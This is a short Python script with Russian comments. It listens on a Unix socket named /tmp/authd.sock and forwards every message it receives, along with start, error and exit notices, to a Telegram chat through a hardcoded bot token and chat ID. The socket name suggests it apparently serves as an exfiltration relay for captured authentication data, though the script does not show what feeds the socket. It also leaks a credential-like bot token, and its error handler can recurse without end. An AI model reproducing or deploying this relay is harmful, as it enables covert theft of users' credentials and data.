import socket
import requests

# Установите ваш токен бота и chat_id
bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'  # Замените на ваш токен
chat_id = '-1002403648422'  # Замените на ваш chat_id

# URL для отправки сообщения в Telegram
TELEGRAM_API_URL = f'https://api.telegram.org/bot{bot_token}/sendMessage'

def send_to_telegram(message):
    """Отправка сообщения в Telegram."""
    payload = {'chat_id': chat_id, 'text': message}
    try:
        response = requests.post(TELEGRAM_API_URL, data=payload)
        if response.status_code == 200:
            print("Message sent successfully.")
        else:
            print(f"Error sending message: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        send_to_telegram(f"Error sending to Telegram: {e}")

def listen_on_socket():
    """Прослушивание сокета и отправка данных в Telegram."""
    # Создаем сокет
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    sock.bind("/tmp/authd.sock")
    
    # Сообщаем в консоль, что скрипт работает
    print("Script is running and listening on socket...")

    # Сообщение о запуске в Telegram
    send_to_telegram("Script is running and listening on socket...")

    while True:
        try:
            data, addr = sock.recvfrom(1024)  # Чтение данных
            if data:
                message = f"Received data: {data.decode('utf-8')}"
                send_to_telegram(message)  # Отправляем в Telegram
        except Exception as e:
            print(f"Error: {e}")
            send_to_telegram(f"Error: {e}")
        except KeyboardInterrupt:
            print("Exiting...")
            send_to_telegram("Exiting...")
            break

if __name__ == "__main__":
    listen_on_socket()
